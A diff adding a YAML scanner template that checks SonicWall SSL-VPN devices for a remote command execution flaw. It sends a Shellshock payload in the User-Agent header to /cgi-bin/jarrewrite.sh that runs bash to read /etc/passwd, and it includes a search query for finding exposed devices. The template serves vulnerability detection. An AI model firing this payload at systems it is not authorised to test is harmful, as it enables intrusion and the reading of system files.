@@ -1,0 +1,21 @@
+name: SonicWall SSL-VPN RCE
+manual: true
+query: (app="SonicWALL-Company's-product" || app="SonicWALL-SSL-VPN")
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/jarrewrite.sh
+      headers:
+        User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: The remote command execution of SonicWALL ssl-vpn was disclosed as
+    exp on January 24. There is a remote command execution vulnerability in this device
+  tags: RCE
